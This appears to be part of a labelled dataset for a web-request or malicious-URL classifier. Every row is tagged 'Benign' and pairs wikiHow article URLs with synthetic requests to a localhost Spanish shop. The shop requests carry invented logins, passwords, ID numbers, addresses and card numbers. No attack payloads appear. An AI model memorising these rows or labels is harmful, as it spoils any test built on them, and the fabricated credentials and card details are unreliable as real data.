http://www.wikihow.com/take-care-of-a-puppy-while-at-work&t=1396516788522&n=271048&k=mainentity,Benign
http://www.wikihow.com/act-like-you%27re-from-abnegation&t=1396526498955&n=787187&k=mainentity,Benign
http://www.wikihow.com/have-a-princess-protection-program-party&t=1396547064153&n=1739232&k=mainentity,Benign
http://www.wikihow.com/manage-curly-hair&t=1396593223760&n=3874868&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=swinson&password=ma4garita&nombre=albana&apellidos=bricios+elecciones&email=felix.barrington8%40waterflyesp.mh&dni=83616222k&direccion=c%2f+prado+de+la+lana+101+12b&ciudad=castrillo+de+duero&cp=46892&provincia=burgos&ntc=2318110387805146&b1=registrar,Benign
http://www.wikihow.com/make-nice-crispy-meats&t=1396547215618&n=1751452&k=mainentity,Benign
http://www.wikihow.com/make-a-monster-on-moshi-monsters&t=1396648089695&n=5950859&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=veneice&password=ensogar&nombre=prudencio&apellidos=torroja+alsina&email=luisi%40professionalhosting.com.ba&dni=05196917k&direccion=universitat+de+girona+164+&ciudad=castell%2c+es&cp=09274&provincia=salamanca&ntc=1741584206084308&b1=registrar,Benign
http://www.wikihow.com/get-a-bunch-of-rugs-floating-in-mid-air-on-wizard101&t=1396648141427&n=5953135&k=mainentity,Benign
http://www.wikihow.com/apply-1930s-style-eye-makeup&t=1396593640817&n=3899304&k=mainentity,Benign
http://www.wikihow.com/paint-exterior-of-your-house&t=1396562659330&n=2563364&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2157&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=pietra&password=aromoso&nombre=baudilio&apellidos=junc%e0+kovac&email=chilcott%40clubforex.bs&dni=06420221r&direccion=de+la+arquitectura%2c+36%2c+&ciudad=santib%e1%f1ez+de+vidriales&cp=19125&provincia=teruel&ntc=4657186460169621&b1=registrar,Benign
http://www.wikihow.com/make-baby-scones&t=1396595233468&n=3984395&k=mainentity,Benign
http://www.wikihow.com/make-jam-e-shirin&t=1396517161725&n=296461&k=mainentity,Benign
http://www.wikihow.com/dump-a-boy&t=1396612241507&n=4781010&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=100&cantidad=4&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-individual-berry-pies&t=1396515826343&n=218657&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vanpatte&password=d35gr298r&nombre=jon%e1s&apellidos=de+la+pe%f1a&email=bedoya%40sunglasses.nom.dm&dni=07616528d&direccion=c%2f+do+gaias%2c+53%2c+1%3fb&ciudad=lascuarre&cp=40146&provincia=la+rioja&ntc=9589656696631384&b1=registrar,Benign
http://www.wikihow.com/migrate-mediawiki-to-wordpress-with-cms2cms&t=1396533875478&n=1133273&k=mainentity,Benign
http://www.wikihow.com/make-sure-your-date-is-comfortable&t=1396570670443&n=2956593&k=mainentity,Benign
http://www.wikihow.com/make-an-apple-cream-tart&t=1396595047684&n=3969007&k=mainentity,Benign
http://www.wikihow.com/make-friends-while-traveling&t=1396571358812&n=2985313&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maire&password=escritorzuela&nombre=edelmira&apellidos=albet+agulla&email=hagman%40codwatw.al&dni=09116322l&direccion=hermanos+lumiere+36%2c+&ciudad=ca%f1ada+de+calatrava&cp=09320&provincia=navarra&ntc=1324289963216201&b1=registrar,Benign
http://www.wikihow.com/install-x-lite-soft-phone&t=1396533737871&n=1127589&k=mainentity,Benign
http://www.wikihow.com/eat-tarte-al-d%27jote&t=1396515765808&n=213065&k=mainentity,Benign
http://www.wikihow.com/measure-outsourcing-costs&t=1396612672259&n=4791694&k=mainentity,Benign
http://www.wikihow.com/peel-and-make-garlic-paste&t=1396546265230&n=1690296&k=mainentity,Benign
http://www.wikihow.com/find-the-best-dog-for-you&t=1396516696704&n=267140&k=mainentity,Benign
http://www.wikihow.com/make-fuzz-sticks-for-a-fire&t=1396631141932&n=5473872&k=mainentity,Benign
http://www.wikihow.com/be-a-good-housemate&t=1396571285815&n=2982609&k=mainentity,Benign
http://www.wikihow.com/make-a-friendship-box&t=1396571830076&n=3002921&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=10&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=flexo11&password=6onexidad&nombre=delmiro&apellidos=wence+andunce&email=bru%40comerciosdeaspe.gq&dni=08589700m&direccion=avda.+libertad%2c+145%2c+&ciudad=zurgena&cp=44590&provincia=guip%fazcoa&ntc=1414832081223200&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yenor&password=tau1ios&nombre=dimas&apellidos=g%f3mez+viroles&email=verebes%40ropadegolf.ie&dni=74017554n&direccion=cami+de+les+animes%2c+7+7%3fg&ciudad=brazatortas&cp=29650&provincia=soria&ntc=8558832012215197&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=downing&pwd=galdo0ia35&remember=on&b1=entrar,Benign
http://www.wikihow.com/accumulate-the-most-credit-card-reward-points&t=1396613135298&n=4807235&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=agathe&pwd=inco5s%fa*til&remember=off&b1=entrar,Benign
http://www.wikihow.com/get-a-boy-to-like-you-in-glasses&t=1396611837532&n=4765206&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=esko&pwd=i2c871es8a9l1&remember=off&b1=entrar,Benign
http://www.wikihow.com/build-a-photon-cannon-in-starcraft&t=1396648588052&n=5973075&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=seagrove&password=p0ralogizar&nombre=thiara&apellidos=grabal%f3s+puiggen%e9&email=vine-clunes%40cor-jet.eh&dni=18729835s&direccion=calle+don+juan+de+austria%2c+116+&ciudad=campillos-sierra&cp=31422&provincia=badajoz&ntc=9673746739672456&b1=registrar,Benign
http://www.wikihow.com/heal-the-body-through-shamanism&t=1396570002355&n=2929561&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=86&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=evelin&pwd=grill%2bar&remember=off&b1=entrar,Benign
http://www.wikihow.com/run-commands-on-server-from-client&t=1396611124633&n=4745221&k=mainentity,Benign
http://www.wikihow.com/accept-or-decline-a-compliment-on-yelp&t=1396629561143&n=5423585&k=mainentity,Benign
http://www.wikihow.com/float-on-a-gingerbread-tree-in-the-jamaadays-party-in-animal-jam&t=1396648272094&n=5959023&k=mainentity,Benign
http://www.wikihow.com/integrate-internet-fax-with-crm&t=1396532066505&n=1049354&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=meijywan&pwd=bienquistar&remember=on&b1=entrar,Benign
http://www.wikihow.com/create-a-good-looking-cover-image-for-your-facebook-page-in-just-5-minutes&t=1396629735659&n=5431805&k=mainentity,Benign
http://www.wikihow.com/answer-an-email-when-you-just-can%27t-be-bothered&t=1396532461983&n=1066218&k=mainentity,Benign
http://www.wikihow.com/get-rid-of-fleas-in-an-outside-dog-kennel&t=1396527115170&n=822988&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2365&b1=confirmar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=moreen&password=retroactiva&nombre=ludovico&apellidos=corbera+bocas&email=dummy.roberdeau%40onlinegratis.al&dni=28186397n&direccion=avda.+duque+de+najera+92+4%3fh&ciudad=sorvil%e1n&cp=26127&provincia=cantabria&ntc=6551003767368321&b1=registrar,Benign
http://www.wikihow.com/make-flavored-fondant&t=1396595143339&n=3976227&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=annalea&pwd=2aramall77&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=91&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=39&cantidad=84&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/stop-your-child-from-being-insolent&t=1396610142121&n=4702214&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=34&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=59&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/be-a-snobby-and-posh-mom-on-animal-jam&t=1396648215110&n=5956355&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tripp&password=shuttle&nombre=sili&apellidos=montanyola+codony&email=landsberg.goff%40ttivoni.py&dni=51999737a&direccion=calle+alicante%2c+62%2c+6%3fg&ciudad=moraleda+de+zafayona&cp=39571&provincia=barcelona&ntc=8543941291101641&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ananda&password=coq35teo&nombre=fiorela&apellidos=batet+castillon&email=blancard2%4011horas.ws&dni=14559882p&direccion=c%2f+residencia+de+pensionistas+de+caranza+132+12e&ciudad=burb%e1guena&cp=24442&provincia=barcelona&ntc=6298757806681015&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1349&b1=confirmar,Benign
http://www.wikihow.com/do-the-super-kamakaze-bomb-in-metroid-fusion&t=1396613802609&n=4829407&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=harihara&pwd=arrepisa&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alwyn&password=lumbral&nombre=farcilaso&apellidos=indaburu+mosquera&email=gribbon%40engibraltar.to&dni=38989049r&direccion=plza.+de+las+candelas+15+&ciudad=ti%f1osillos&cp=46470&provincia=guip%fazcoa&ntc=3094599355025527&b1=registrar,Benign
http://www.wikihow.com/make-carrot-ice-cream-in-harvest-moon:-animal-parade&t=1396649558602&n=6008082&k=mainentity,Benign
http://wiki.com/global/estilos.php,Benign
http://www.wikihow.com/change-a-natural-gas-and-electric-supplier-(usa)&t=1396562776842&n=2571900&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shih-hsi&password=hereja&nombre=noel+stefani&apellidos=rossello&email=relph-jeffries%40escapadajoven.bs&dni=41439619j&direccion=plza.+albatros+130+&ciudad=saelices+de+mayorga&cp=50373&provincia=soria&ntc=6268846541803628&b1=registrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=965&b1=pasar+por+caja,Benign
http://www.wikihow.com/do-a-sexy-cosplay-when-you-are-fat&t=1396528188631&n=866653&k=mainentity,Benign
http://www.wikihow.com/start-a-native-plant-garden-in-new-zealand&t=1396561986001&n=2521540&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85&cantidad=72&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/get-windows-8-wallpaper&t=1396611386117&n=4752533&k=mainentity,Benign
http://www.wikihow.com/incorporate-a-wine-rack-under-a-kitchen-counter&t=1396562731527&n=2568668&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=electron&password=honrosa&nombre=ant%f3n&apellidos=lynch+cros&email=binina%40lawn.tg&dni=43929455f&direccion=avenida+olarizu+161%2c+12c&ciudad=castielfabib&cp=08189&provincia=toledo&ntc=0686948761265881&b1=registrar,Benign
http://www.wikihow.com/get-your-dog-to-play-with-you&t=1396516699101&n=267216&k=mainentity,Benign
http://www.wikihow.com/make-cape-breton-tea-bannock&t=1396594919931&n=3955839&k=mainentity,Benign
http://www.wikihow.com/avoid-internet-fraud-with-wegolook.com&t=1396526655844&n=794470&k=mainentity,Benign
http://www.wikihow.com/create-your-account-on-zumbl&t=1396532293287&n=1058974&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=talbott&pwd=ojosa&remember=on&b1=entrar,Benign
http://www.wikihow.com/make-an-aarp-credit-card-payment&t=1396612870844&n=4796922&k=mainentity,Benign
http://www.wikihow.com/organise-a-good-rave-party&t=1396546602584&n=1715244&k=mainentity,Benign
http://www.wikihow.com/make-deep-set-eyes-look-more-open&t=1396593716214&n=3903556&k=mainentity,Benign
http://www.wikihow.com/care-for-a-jack-russell&t=1396527080237&n=821556&k=mainentity,Benign
http://www.wikihow.com/decorate-a-baby-girl%27s-bedroom-with-a-low-budget&t=1396562044170&n=2524788&k=mainentity,Benign
http://www.wikihow.com/find-free-wallpaper-for-your-mobile-on-the-internet&t=1396533542256&n=1117885&k=mainentity,Benign
http://www.wikihow.com/declutter-a-pantry&t=1396563078990&n=2591108&k=mainentity,Benign
http://www.wikihow.com/learn-more-about-harry-potter-characters&t=1396633362276&n=5525677&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7945&b1=confirmar,Benign
http://www.wikihow.com/send-a-sample-of-a-book-to-a-kindle-2-(from-amazon)&t=1396633294897&n=5522721&k=mainentity,Benign
http://www.wikihow.com/feed-a-large-family-on-a-budget&t=1396545866367&n=1666504&k=mainentity,Benign
http://www.wikihow.com/become-the-hero-of-time-in-legend-of-zelda&t=1396528132153&n=863657&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=33&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-fresh-chocolate-n%27-sugar-donuts&t=1396595023519&n=3966115&k=mainentity,Benign
http://www.wikihow.com/make-rose-vodka&t=1396517347388&n=307369&k=mainentity,Benign
http://www.wikihow.com/buy-a-cheap-sony-laptop-battery&t=1396532663815&n=1074456&k=mainentity,Benign
http://www.wikihow.com/act-like-a-werewolf-vampire-hybrid&t=1396528203129&n=867529&k=mainentity,Benign
http://www.wikihow.com/hire-people-to-mow-your-lawn&t=1396563584170&n=2622062&k=mainentity,Benign
http://www.wikihow.com/buy-the-best-laptop-for-your-money&t=1396532001474&n=1046030&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2286&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=toshi&pwd=go81alonier&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ogan&password=esp7ndia&nombre=macarena&apellidos=maduell+rom%e0&email=ohanlon%40gestionsoftware.mz&dni=54549645q&direccion=ganchillo%2c+72%2c+1-a&ciudad=cuarte+de+huerva&cp=48700&provincia=huesca&ntc=9442191219823547&b1=registrar,Benign
http://www.wikihow.com/comfort-a-person-who-feels-unloved&t=1396571384866&n=2986425&k=mainentity,Benign
http://www.wikihow.com/learn-to-love-classical-books&t=1396527680136&n=842577&k=mainentity,Benign
http://www.wikihow.com/befriend-a-snob&t=1396571629844&n=2995621&k=mainentity,Benign
http://www.wikihow.com/create-a-chrome-extension-for-your-website&t=1396532377156&n=1063042&k=mainentity,Benign
http://www.wikihow.com/pick-stock-options&t=1396613367873&n=4815507&k=mainentity,Benign
http://www.wikihow.com/be-a-book-lover&t=1396527618933&n=840209&k=mainentity,Benign
http://www.wikihow.com/get-a-girl&t=1396570753713&n=2960045&k=mainentity,Benign
http://localhost:8080/tienda1/imagenes/cmenbul.gif,Benign
http://www.wikihow.com/get-your-house-organized&t=1396563089770&n=2591532&k=mainentity,Benign
http://www.wikihow.com/choose-low-carb-ingredients&t=1396594758740&n=3945799&k=mainentity,Benign
http://www.wikihow.com/apply-for-a-credit-card-balance-transfer&t=1396613141269&n=4807431&k=mainentity,Benign
http://www.wikihow.com/make-berry-blue-blueberry-muffins&t=1396527196232&n=828036&k=mainentity,Benign
http://www.wikihow.com/make-a-tikka-pizza&t=1396515935078&n=226570&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bousfiel59&password=80pe4tat7va&nombre=deianiva&apellidos=laspiur&email=meader_brey%40elxxi.tr&dni=06669723e&direccion=pintor+clemente+arraiz%2c+69+6f&ciudad=valdeltormo&cp=26550&provincia=burgos&ntc=1825873481961241&b1=registrar,Benign
http://www.wikihow.com/end-your-business-day&t=1396612477196&n=4787143&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=soucie6&password=espal1%f3n&nombre=iannir&apellidos=esterric+bou&email=bugariri%40tiposdedrogas.dm&dni=48204546l&direccion=c%2f+poeta+navarro+cabanes%2c+195+8%3fd&ciudad=agramunt&cp=03841&provincia=salamanca&ntc=2490238959357333&b1=registrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dibler&pwd=ahuyentar&remember=off&b1=entrar,Benign
http://www.wikihow.com/make-sweet-sinasad-rice&t=1396517886394&n=349535&k=mainentity,Benign
http://www.wikihow.com/kiss-with-your-arm-in-a-sling&t=1396570968722&n=2969125&k=mainentity,Benign
http://www.wikihow.com/save-money-when-buying-computers&t=1396532007530&n=1046218&k=mainentity,Benign
"http://www.wikihow.com/be-a-lover,-not-a-fighter&t=1396569889042&n=2924885&k=mainentity",Benign
http://www.wikihow.com/change-the-data-encryptor-password-in-mackeeper&t=1396532816395&n=1082556&k=mainentity,Benign
http://www.wikihow.com/help-a-friend-without-being-intrusive&t=1396571418841&n=2987573&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=amalea&pwd=tacazo&remember=off&b1=entrar,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=100&cantidad=30&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/stay-warm-at-the-farm-in-winter&t=1396612846473&n=4796034&k=mainentity,Benign
http://www.wikihow.com/make-a-simple-meat-loaf&t=1396547193845&n=1749232&k=mainentity,Benign
http://www.wikihow.com/add-hairpieces-to-a-hairdo&t=1396592934807&n=3858315&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100&cantidad=82&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/make-a-taoist-altar&t=1396570214213&n=2937717&k=mainentity,Benign
http://www.wikihow.com/categorize-posts-on-socialcast&t=1396630022579&n=5443101&k=mainentity,Benign
http://www.wikihow.com/do-an-assisted-flip&t=1396632142796&n=5496801&k=mainentity,Benign
http://www.wikihow.com/observe-obligatory-charity-(zakat)&t=1396570088137&n=2932621&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sue-joe&password=ma460pla&nombre=samira&apellidos=de+la+c%e1rcel+bascomta&email=wenham3%40drivinn.tr&dni=52820767w&direccion=calle+tenerias+159+&ciudad=vilanova+de+l%27aguda&cp=16373&provincia=segovia&ntc=4797226052502637&b1=registrar,Benign
http://www.wikihow.com/wait-through-long-downloads&t=1396532242008&n=1057222&k=mainentity,Benign
http://www.wikihow.com/move-country-to-a-place-where-there-is-a-different-language-and-stay-sane&t=1396563847068&n=2638150&k=mainentity,Benign
http://www.wikihow.com/have-fun-in-x-com:-ufo-defense-after-beating-it&t=1396648493235&n=5968391&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=andrea3&password=7ngolado&nombre=georgia&apellidos=bayano+fiallos&email=sorili%40am-si.nf&dni=34756820w&direccion=calle+veintinueve+de+abril%2c+147+5%3fh&ciudad=sol%f3rzano&cp=43153&provincia=madrid&ntc=3137949230277412&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aloise&password=saler%f3n&nombre=josu&apellidos=sauri+basega%f1a&email=pambieri2%40ofertachina.uz&dni=71283179s&direccion=c%2f+lareira%2c+130+1%3fa&ciudad=alfambra&cp=37082&provincia=burgos&ntc=4889290739209180&b1=registrar,Benign
http://www.wikihow.com/make-movie-files-smaller-with-adobe-media-encoder&t=1396533659219&n=1123189&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=siso&password=d7sgramar&nombre=chera%ed&apellidos=borja+galdon&email=peerzada%40tarifasdevuelos.mh&dni=76041766v&direccion=c%2f+cabeza+de+vaca%2c+150+6%3fc&ciudad=castej%f3n+de+sos&cp=28411&provincia=cantabria&ntc=3622353817159390&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gazier&password=hidalg_o&nombre=quinto&apellidos=oliz&email=tanimoto_hassen%40autobuses-hibridos.tw&dni=27834912j&direccion=calle+levante%2c+143+11%3fc&ciudad=cuevas+del+valle&cp=34410&provincia=salamanca&ntc=1227134798868494&b1=registrar,Benign
http://www.wikihow.com/locate-a-lost-or-forgotten-jing/screencast.com-shareable-url&t=1396630465248&n=5458555&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sacchett5&pwd=ev15rs124&remember=off&b1=entrar,Benign
http://www.wikihow.com/compare-jesus-and-mohammed&t=1396570059158&n=2931437&k=mainentity,Benign
http://www.wikihow.com/make-and-use-friendship-bread&t=1396594900749&n=3954043&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=9&b1=a%f1adir+al+carrito,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7587&b1=pasar+por+caja,Benign
http://www.wikihow.com/time-your-trip-to-sydney&t=1396630719945&n=5463262&k=mainentity,Benign
http://www.wikihow.com/shop-for-a-used-truck&t=1396531479417&n=1022969&k=mainentity,Benign
http://www.wikihow.com/make-chipotle-rice&t=1396517800775&n=342515&k=mainentity,Benign
http://www.wikihow.com/have-very-soft-hair&t=1396516482441&n=255130&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tomas&password=es07ca&nombre=amaru&apellidos=lozada&email=stacquet6%40apicultor.so&dni=69285477r&direccion=calle+orzan+94%2c+4-h&ciudad=villameriel&cp=34490&provincia=cantabria&ntc=1582623470129996&b1=registrar,Benign
http://www.wikihow.com/find-the-best-cell-phone-deal&t=1396533336267&n=1108605&k=mainentity,Benign
http://www.wikihow.com/create-curly-brackets-on-an-azerty-keyboard-(mac)&t=1396533239048&n=1104653&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3138&b1=confirmar,Benign
http://www.wikihow.com/put-together-a-dell-optiplex-760&t=1396531962982&n=1044938&k=mainentity,Benign
http://www.wikihow.com/get-benefit-from-web-design-service-in-adelaide&t=1396534103701&n=1143853&k=mainentity,Benign
http://www.wikihow.com/wear-a-winter-scarf-correctly&t=1396518004314&n=353646&k=mainentity,Benign
http://www.wikihow.com/set-unity-gain&t=1396534405947&n=1159257&k=mainentity,Benign
http://www.wikihow.com/behave-in-a-gurdwara&t=1396570233370&n=2938421&k=mainentity,Benign
http://www.wikihow.com/manage-curly-%26-dry-hair&t=1396593221295&n=3874688&k=mainentity,Benign
http://www.wikihow.com/not-to-get-in-trouble-for-doing-some-thing&t=1396569930516&n=2926565&k=mainentity,Benign
http://www.wikihow.com/be-a-friend-to-your-friend&t=1396571372225&n=2985805&k=mainentity,Benign
http://www.wikihow.com/heal-your-broken-heart-(girls-only)&t=1396612280659&n=4782866&k=mainentity,Benign
http://www.wikihow.com/use--flash-video-mx-pro&t=1396533826840&n=1131593&k=mainentity,Benign
http://www.wikihow.com/make-your-own-warrior-based-game&t=1396528259997&n=870349&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=wren&password=acrecer&nombre=mill%e1n&apellidos=fadrique+boher&email=fielerling-mcalliney%40zoorapia.org&dni=19614047s&direccion=c%2f+garridos%2c+86+3h&ciudad=mallabia&cp=21820&provincia=guip%fazcoa&ntc=4869029822529267&b1=registrar,Benign
http://www.wikihow.com/manage-your-friends-list-on-a-goodreads-account&t=1396629673323&n=5428985&k=mainentity,Benign
http://www.wikihow.com/close-port-135&t=1396532990107&n=1092124&k=mainentity,Benign
http://www.wikihow.com/persuade-your-parents-into-letting-you-shop-for-yourself&t=1396613852955&n=4830512&k=mainentity,Benign
http://www.wikihow.com/make-my-room-romantic-and-girly-(girls-only)&t=1396562091280&n=2527156&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5864&b1=pasar+por+caja,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ruthi&password=1nterm0d8ar&nombre=clemencio&apellidos=ayats+duhalde&email=chenguelaia%40chicashumedas.km&dni=84418704x&direccion=calle+duque+cornejo%2c+153%2c+&ciudad=miajadas&cp=15108&provincia=navarra&ntc=1563800196317216&b1=registrar,Benign
http://www.wikihow.com/boot-vista-in-safe-mode&t=1396610778211&n=4729342&k=mainentity,Benign
http://www.wikihow.com/save-a-terrible-date&t=1396570677659&n=2956897&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=85&cantidad=19&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/buy-a-tablet&t=1396534127783&n=1145241&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gwo-chun&password=1s92n9c0%f3n&nombre=honorato&apellidos=hernando&email=sirichanva%40cementoscalibra.co&dni=50930354m&direccion=c%2f+menendez+pelayo+2%2c+&ciudad=soria&cp=37219&provincia=palencia&ntc=5697783044165984&b1=registrar,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=koralle&password=r1al2e&nombre=tatiano&apellidos=alcina+carameso&email=frankovich_ferny%40bloger%f3tico.gr&dni=79288923b&direccion=calle+can+arbo%e7%2c+28+&ciudad=alcolea+del+r%edo&cp=07190&provincia=lleida&ntc=5215154184389429&b1=registrar,Benign
http://www.wikihow.com/train-a-blind-dog-to-handle-the-stairs&t=1396632315890&n=5500542&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2997&b1=pasar+por+caja,Benign
http://www.wikihow.com/download-free-stuff-to-use-in-your-sims-complete-collection-game&t=1396648700774&n=5978551&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=constabl7&pwd=des4en97r&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2149&b1=pasar+por+caja,Benign
http://www.wikihow.com/move-from-mac-os-x-to-linux&t=1396610763344&n=4728678&k=mainentity,Benign
http://www.wikihow.com/make-a-tomahawk&t=1396563026878&n=2588136&k=mainentity,Benign
http://www.wikihow.com/choose-a-game-for-your-ipad&t=1396534184215&n=1148053&k=mainentity,Benign
http://www.wikihow.com/decide-between-facebook-or-a-website-for-your-company&t=1396629743210&n=5432033&k=mainentity,Benign
http://www.wikihow.com/download-music-onto-your-kindle-fire&t=1396633272546&n=5521713&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=iggie&password=soletero&nombre=gaia&apellidos=bartrina+garc%e9s&email=burbutachvili7%40archivodeimagenes.tk&dni=62137860w&direccion=av.+ramon+carande+97%2c+9d&ciudad=san+lorenzo+de+calatrava&cp=21891&provincia=girona&ntc=0134599022819322&b1=registrar,Benign
http://www.wikihow.com/play-101-kisses&t=1396546951030&n=1733512&k=mainentity,Benign
http://www.wikihow.com/cope-with-sun-sensitivity&t=1396594001653&n=3918048&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=porty&password=completivamente&nombre=marcelino&apellidos=barbero+delgados&email=avgoustidou_schipper%40unanuevavisionenortodoncia.la&dni=61061586j&direccion=c%2f+cedro+132+8-f&ciudad=corte+de+peleas&cp=18811&provincia=huelva&ntc=6147207230587526&b1=registrar,Benign
http://www.wikihow.com/choose-a-cordless-vacuum&t=1396562287486&n=2538480&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=74&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8084&b1=confirmar,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=507&b1=confirmar,Benign
http://www.wikihow.com/find-missing-life-insurance-policy-information&t=1396613320539&n=4813879&k=mainentity,Benign
http://www.wikihow.com/reduce-acne-using-a-tea-tree-face-mask&t=1396594379289&n=3934497&k=mainentity,Benign
http://www.wikihow.com/natural-everyday-make-up&t=1396593901678&n=3913552&k=mainentity,Benign
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=36&b1=a%f1adir+al+carrito,Benign
http://www.wikihow.com/get-over-a-close-friend-changing-schools&t=1396571352695&n=2985113&k=mainentity,Benign
http://www.wikihow.com/catch-a-crush%27s-attention-when-passing-him-at-school&t=1396611803716&n=4763972&k=mainentity,Benign
http://www.wikihow.com/make-a-man-pursue-you&t=1396570758940&n=2960237&k=mainentity,Benign
http://www.wikihow.com/go-back-to-a-place-on-roblox-that-you-got-kicked-from&t=1396647895117&n=5941687&k=mainentity,Benign
